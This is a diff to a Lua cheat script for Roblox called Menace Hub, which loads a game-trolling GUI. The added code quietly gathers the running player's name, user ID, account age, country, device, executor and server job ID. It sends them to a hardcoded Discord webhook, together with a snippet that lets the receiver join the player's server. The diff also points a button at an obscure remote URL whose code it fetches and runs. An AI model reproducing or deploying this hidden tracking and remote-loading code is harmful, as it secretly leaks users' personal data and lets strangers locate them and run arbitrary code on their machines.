@@ -1,3 +1,378 @@
+-- Table for mapping country codes to full country names with emojis
+local countryNames = {
+    ["AF"] = "Afghanistan 🇦🇫",
+    ["AL"] = "Albania 🇦🇱",
+    ["DZ"] = "Algeria 🇩🇿",
+    ["AS"] = "American Samoa 🇦🇸",
+    ["AD"] = "Andorra 🇦🇩",
+    ["AO"] = "Angola 🇦🇴",
+    ["AI"] = "Anguilla 🇦🇮",
+    ["AG"] = "Antigua and Barbuda 🇦🇬",
+    ["AR"] = "Argentina 🇦🇷",
+    ["AM"] = "Armenia 🇦🇲",
+    ["AW"] = "Aruba 🇦🇼",
+    ["AU"] = "Australia 🇦🇺",
+    ["AT"] = "Austria 🇦🇹",
+    ["AZ"] = "Azerbaijan 🇦🇿",
+    ["BS"] = "Bahamas 🇧🇸",
+    ["BH"] = "Bahrain 🇧🇭",
+    ["BD"] = "Bangladesh 🇧🇩",
+    ["BB"] = "Barbados 🇧🇧",
+    ["BY"] = "Belarus 🇧🇾",
+    ["BE"] = "Belgium 🇧🇪",
+    ["BZ"] = "Belize 🇧🇿",
+    ["BJ"] = "Benin 🇧🇯",
+    ["BM"] = "Bermuda 🇧🇲",
+    ["BT"] = "Bhutan 🇧🇹",
+    ["BO"] = "Bolivia 🇧🇴",
+    ["BA"] = "Bosnia and Herzegovina 🇧🇦",
+    ["BW"] = "Botswana 🇧🇼",
+    ["BR"] = "Brazil 🇧🇷",
+    ["BN"] = "Brunei 🇧🇳",
+    ["BG"] = "Bulgaria 🇧🇬",
+    ["BF"] = "Burkina Faso 🇧🇫",
+    ["BI"] = "Burundi 🇧🇮",
+    ["KH"] = "Cambodia 🇰🇭",
+    ["CM"] = "Cameroon 🇨🇲",
+    ["CA"] = "Canada 🇨🇦",
+    ["CV"] = "Cape Verde 🇨🇻",
+    ["KY"] = "Cayman Islands 🇰🇾",
+    ["CF"] = "Central African Republic 🇨🇫",
+    ["TD"] = "Chad 🇹🇩",
+    ["CL"] = "Chile 🇨🇱",
+    ["CN"] = "China 🇨🇳",
+    ["CO"] = "Colombia 🇨🇴",
+    ["KM"] = "Comoros 🇰🇲",
+    ["CG"] = "Congo 🇨🇬",
+    ["CD"] = "Congo (DRC) 🇨🇩",
+    ["CR"] = "Costa Rica 🇨🇷",
+    ["CI"] = "Côte d'Ivoire 🇨🇮",
+    ["HR"] = "Croatia 🇭🇷",
+    ["CU"] = "Cuba 🇨🇺",
+    ["CY"] = "Cyprus 🇨🇾",
+    ["CZ"] = "Czechia 🇨🇿",
+    ["DK"] = "Denmark 🇩🇰",
+    ["DJ"] = "Djibouti 🇩🇯",
+    ["DM"] = "Dominica 🇩🇲",
+    ["DO"] = "Dominican Republic 🇩🇴",
+    ["EC"] = "Ecuador 🇪🇨",
+    ["EG"] = "Egypt 🇪🇬",
+    ["SV"] = "El Salvador 🇸🇻",
+    ["GQ"] = "Equatorial Guinea 🇬🇶",
+    ["ER"] = "Eritrea 🇪🇷",
+    ["EE"] = "Estonia 🇪🇪",
+    ["SZ"] = "Eswatini 🇸🇿",
+    ["ET"] = "Ethiopia 🇪🇹",
+    ["FJ"] = "Fiji 🇫🇯",
+    ["FI"] = "Finland 🇫🇮",
+    ["FR"] = "France 🇫🇷",
+    ["GA"] = "Gabon 🇬🇦",
+    ["GM"] = "Gambia 🇬🇲",
+    ["GE"] = "Georgia 🇬🇪",
+    ["DE"] = "Germany 🇩🇪",
+    ["GH"] = "Ghana 🇬🇭",
+    ["GR"] = "Greece 🇬🇷",
+    ["GD"] = "Grenada 🇬🇩",
+    ["GU"] = "Guam 🇬🇺",
+    ["GT"] = "Guatemala 🇬🇹",
+    ["GN"] = "Guinea 🇬🇳",
+    ["GW"] = "Guinea-Bissau 🇬🇼",
+    ["GY"] = "Guyana 🇬🇾",
+    ["HT"] = "Haiti 🇭🇹",
+    ["HN"] = "Honduras 🇭🇳",
+    ["HU"] = "Hungary 🇭🇺",
+    ["IS"] = "Iceland 🇮🇸",
+    ["IN"] = "India 🇮🇳",
+    ["ID"] = "Indonesia 🇮🇩",
+    ["IR"] = "Iran 🇮🇷",
+    ["IQ"] = "Iraq 🇮🇶",
+    ["IE"] = "Ireland 🇮🇪",
+    ["IL"] = "Israel 🇮🇱",
+    ["IT"] = "Italy 🇮🇹",
+    ["JM"] = "Jamaica 🇯🇲",
+    ["JP"] = "Japan 🇯🇵",
+    ["JO"] = "Jordan 🇯🇴",
+    ["KZ"] = "Kazakhstan 🇰🇿",
+    ["KE"] = "Kenya 🇰🇪",
+    ["KI"] = "Kiribati 🇰🇮",
+    ["KP"] = "North Korea 🇰🇵",
+    ["KR"] = "South Korea 🇰🇷",
+    ["KW"] = "Kuwait 🇰🇼",
+    ["KG"] = "Kyrgyzstan 🇰🇬",
+    ["LA"] = "Laos 🇱🇦",
+    ["LV"] = "Latvia 🇱🇻",
+    ["LB"] = "Lebanon 🇱🇧",
+    ["LS"] = "Lesotho 🇱🇸",
+    ["LR"] = "Liberia 🇱🇷",
+    ["LY"] = "Libya 🇱🇾",
+    ["LI"] = "Liechtenstein 🇱🇮",
+    ["LT"] = "Lithuania 🇱🇹",
+    ["LU"] = "Luxembourg 🇱🇺",
+    ["MG"] = "Madagascar 🇲🇬",
+    ["MW"] = "Malawi 🇲🇼",
+    ["MY"] = "Malaysia 🇲🇾",
+    ["MV"] = "Maldives 🇲🇻",
+    ["ML"] = "Mali 🇲🇱",
+    ["MT"] = "Malta 🇲🇹",
+    ["MH"] = "Marshall Islands 🇲🇭",
+    ["MR"] = "Mauritania 🇲🇷",
+    ["MU"] = "Mauritius 🇲🇺",
+    ["MX"] = "Mexico 🇲🇽",
+    ["FM"] = "Micronesia 🇫🇲",
+    ["MD"] = "Moldova 🇲🇩",
+    ["MC"] = "Monaco 🇲🇨",
+    ["MN"] = "Mongolia 🇲🇳",
+    ["ME"] = "Montenegro 🇲🇪",
+    ["MA"] = "Morocco 🇲🇦",
+    ["MZ"] = "Mozambique 🇲🇿",
+    ["MM"] = "Myanmar 🇲🇲",
+    ["NA"] = "Namibia 🇳🇦",
+    ["NR"] = "Nauru 🇳🇷",
+    ["NP"] = "Nepal 🇳🇵",
+    ["NL"] = "Netherlands 🇳🇱",
+    ["NZ"] = "New Zealand 🇳🇿",
+    ["NI"] = "Nicaragua 🇳🇮",
+    ["NE"] = "Niger 🇳🇪",
+    ["NG"] = "Nigeria 🇳🇬",
+    ["NO"] = "Norway 🇳🇴",
+    ["OM"] = "Oman 🇴🇲",
+    ["PK"] = "Pakistan 🇵🇰",
+    ["PW"] = "Palau 🇵🇼",
+    ["PS"] = "Palestine 🇵🇸",
+    ["PA"] = "Panama 🇵🇦",
+    ["PG"] = "Papua New Guinea 🇵🇬",
+    ["PY"] = "Paraguay 🇵🇾",
+    ["PE"] = "Peru 🇵🇪",
+    ["PH"] = "Philippines 🇵🇭",
+    ["PL"] = "Poland 🇵🇱",
+    ["PT"] = "Portugal 🇵🇹",
+    ["QA"] = "Qatar 🇶🇦",
+    ["RO"] = "Romania 🇷🇴",
+    ["RU"] = "Russia 🇷🇺",
+    ["RW"] = "Rwanda 🇷🇼",
+    ["WS"] = "Samoa 🇼🇸",    
+    ["SM"] = "San Marino 🇸🇲",    
+    ["ST"] = "Sao Tome and Principe 🇸🇹",    
+    ["SA"] = "Saudi Arabia 🇸🇦",    
+    ["SN"] = "Senegal 🇸🇳",    
+    ["RS"] = "Serbia 🇷🇸",    
+    ["SC"] = "Seychelles 🇸🇨",    
+    ["SL"] = "Sierra Leone 🇸🇱",    
+    ["SG"] = "Singapore 🇸🇬",    
+    ["SK"] = "Slovakia 🇸🇰",    
+    ["SI"] = "Slovenia 🇸🇮",    
+    ["SB"] = "Solomon Islands 🇸🇧",    
+    ["SO"] = "Somalia 🇸🇴",    
+    ["ZA"] = "South Africa 🇿🇦",    
+    ["SS"] = "South Sudan 🇸🇸",    
+    ["ES"] = "Spain 🇪🇸",    
+    ["LK"] = "Sri Lanka 🇱🇰",    
+    ["SD"] = "Sudan 🇸🇩",    
+    ["SR"] = "Suriname 🇸🇷",    
+    ["SE"] = "Sweden 🇸🇪",    
+    ["CH"] = "Switzerland 🇨🇭",    
+    ["SY"] = "Syria 🇸🇾",    
+    ["TW"] = "Taiwan 🇹🇼",    
+    ["TJ"] = "Tajikistan 🇹🇯",    
+    ["TZ"] = "Tanzania 🇹🇿",    
+    ["TH"] = "Thailand 🇹🇭",    
+    ["TL"] = "Timor-Leste 🇹🇱",    
+    ["TG"] = "Togo 🇹🇬",    
+    ["TO"] = "Tonga 🇹🇴",    
+    ["TT"] = "Trinidad and Tobago 🇹🇹",    
+    ["TN"] = "Tunisia 🇹🇳",    
+    ["TR"] = "Turkey 🇹🇷",    
+    ["TM"] = "Turkmenistan 🇹🇲",    
+    ["TV"] = "Tuvalu 🇹🇻",    
+    ["UG"] = "Uganda 🇺🇬",    
+    ["UA"] = "Ukraine 🇺🇦",    
+    ["AE"] = "United Arab Emirates 🇦🇪",    
+    ["GB"] = "United Kingdom 🇬🇧",    
+    ["US"] = "United States 🇺🇸",    
+    ["UY"] = "Uruguay 🇺🇾",    
+    ["UZ"] = "Uzbekistan 🇺🇿",    
+    ["VU"] = "Vanuatu 🇻🇺",    
+    ["VE"] = "Venezuela 🇻🇪",    
+    ["VN"] = "Vietnam 🇻🇳",    
+    ["YE"] = "Yemen 🇾🇪",    
+    ["ZM"] = "Zambia 🇿🇲",    
+    ["ZW"] = "Zimbabwe 🇿🇼",    
+    ["Unknown"] = "Unknown Country 🌍"
+}
+
+-- Function to get full country name from code
+local function getFullCountryName(code)
+    return countryNames[code] or "Unknown Region"
+end
+
+local executor
+
+if syn then
+    executor = "Synapse X"
+elseif fluxus then
+    executor = "Fluxus"
+elseif KRNL then
+    executor = "KRNL"
+elseif ScriptWare then
+    executor = "Script-Ware"
+elseif ProtoSmasher then
+    executor = "ProtoSmasher"
+elseif SirHurt then
+    executor = "SirHurt"
+elseif EasyExploit then
+    executor = "EasyExploit"
+elseif Comet then
+    executor = "Comet"
+elseif Elysian then
+    executor = "Elysian"
+elseif Oxygen then
+    executor = "Oxygen U"
+elseif Evon then
+    executor = "Evon"
+elseif Cryptic then
+    executor = "Cryptic"
+elseif Codex then
+    executor = "Codex"
+elseif Nihon then
+    executor = "Nihon"
+elseif getexecutorname then
+    executor = getexecutorname()
+elseif Delta then
+    executor = "Delta"
+elseif Arceus then
+    executor = "Arceus X"
+elseif Kiwi then
+    executor = "Kiwi X"
+elseif Zeus then
+    executor = "Zeus"
+elseif Andromeda then
+    executor = "Andromeda"
+elseif Poseidon then
+    executor = "Poseidon"
+elseif Hydrogen then
+    executor = "Hydrogen"
+elseif Vega then
+    executor = "Vega X"
+else
+    executor = "Unknown Executor"
+end
+
+local player = game:GetService("Players").LocalPlayer
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+local playerId = player.UserId
+local placeId = game.PlaceId
+local placeVersion = game.PlaceVersion
+local jobId = game.JobId
+local accountAge = player.AccountAge
+local countryCode = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(player)
+local region = getFullCountryName(countryCode) -- Get full region name
+
+local gameLink = "https://www.roblox.com/games/" .. tostring(placeId) .. "/" .. gameName:gsub(" ", "-")
+
+local UserInputService = game:GetService("UserInputService")
+local platform = UserInputService.TouchEnabled and "Mobile" or "PC"
+
+local url = "https://discord.com/api/webhooks/1290698129024487565/w7avd8vNUsMy6SXm8v2vSXRKh4m48nUznfieQSbwaJvqbFjth9jC6a7SmbOTYESN8EBr"
+
+local data = {
+   ["content"] = "# Menace Hub User",
+   ["embeds"] = {{
+      ["title"] = "**Player Information**",
+      ["description"] = "Details about the player and the game.",
+      ["type"] = "rich",
+      ["color"] = tonumber(0x7289DA),
+      ["fields"] = {
+         {
+            ["name"] = "Player Name",
+            ["value"] = player.Name,
+            ["inline"] = true
+         },
+         {
+            ["name"] = "User ID",
+            ["value"] = tostring(playerId),
+            ["inline"] = true
+         },
+         {
+            ["name"] = "Game Name",
+            ["value"] = gameName,
+            ["inline"] = false
+         },
+         {
+            ["name"] = "Game ID",
+            ["value"] = tostring(placeId),
+            ["inline"] = true
+         },
+         {
+            ["name"] = "Game Version",
+            ["value"] = tostring(placeVersion),
+            ["inline"] = true
+         },
+         {
+            ["name"] = "Server Job ID",
+            ["value"] = jobId,
+            ["inline"] = false
+         },
+         {
+            ["name"] = "Execution Time",
+            ["value"] = currentTime,
+            ["inline"] = false
+         },
+         {
+            ["name"] = "Executor",
+            ["value"] = executor,
+            ["inline"] = true
+         },
+         {
+            ["name"] = "Account Age (Days)",
+            ["value"] = tostring(accountAge),
+            ["inline"] = true
+         },
+         {
+            ["name"] = "Device Used",
+            ["value"] = platform,
+            ["inline"] = true
+         },
+         {
+            ["name"] = "Country",
+            ["value"] = region or "Unknown",
+            ["inline"] = true
+         },
+         {
+            ["name"] = "Game Link",
+            ["value"] = gameLink,
+            ["inline"] = false
+         },
+         {
+            ["name"] = "Copy this to join the server",
+            ["value"] = [[
+local gameId = "]] .. tostring(placeId) .. [["
+local jobId = "]] .. jobId .. [["
+
+function joinServer(gameId, jobId)
+    local Players = game:GetService("Players")
+    local TeleportService = game:GetService("TeleportService")
+    TeleportService:TeleportToPlaceInstance(gameId, jobId, Players.LocalPlayer)
+end
+
+joinServer(gameId, jobId)
+]],
+            ["inline"] = false
+         }
+      }
+   }}
+}
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+
+local request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
 local OrionLib = loadstring(game:HttpGet(('https://paste.ee/r/E9tFZ/0')))()
 
 function loading()
@@ -141,13 +516,13 @@ local Tab = Window:NewTab("Menace Scripts")
 local Section = Tab:NewSection("Trolling Scripts")
 
 Section:NewButton("Sus Missile (Head Bang)", "Run Sus Missile Headbang", function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-    print("Clicked")
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Aojfbrkalckspkfndns/Aofjdbbssk/refs/heads/main/dfjhgksiuwesgihkb'))()
+    print("Executed Sus Missile!")
 end)
 
 Section:NewButton("Infinite Yield", "Run Infinite Yield", function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-    print("Clicked")
+    print("Executed Infinite Yield!")
 end)
 
 local Tab = Window:NewTab("RMA Trolling Booth")
@@ -187,5 +562,38 @@ Section:NewButton("Blacklist All", "Blacklist all players", function()
 
     checkForNewPlayers()
     end)
+
+Section:NewButton("Blacklist All", "Blacklist all players", function()
+    local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local function removeFromBlacklist(player)
+    if player ~= LocalPlayer then
+        local args = {
+            [1] = "RemoveBlacklist",
+            [2] = player.Name
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("CustomiseBooth"):FireServer(unpack(args))
+    end
+end
+
+local function checkForNewPlayers()
+    while true do
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer then
+                removeFromBlacklist(player)
+            end
+        end
+        wait(1)
+    end
+end
+
+Players.PlayerAdded:Connect(function(player)
+    wait(1)
+    removeFromBlacklist(player)
+end)
+
+checkForNewPlayers()
+end)
 wait(1.5)
 settoggle()
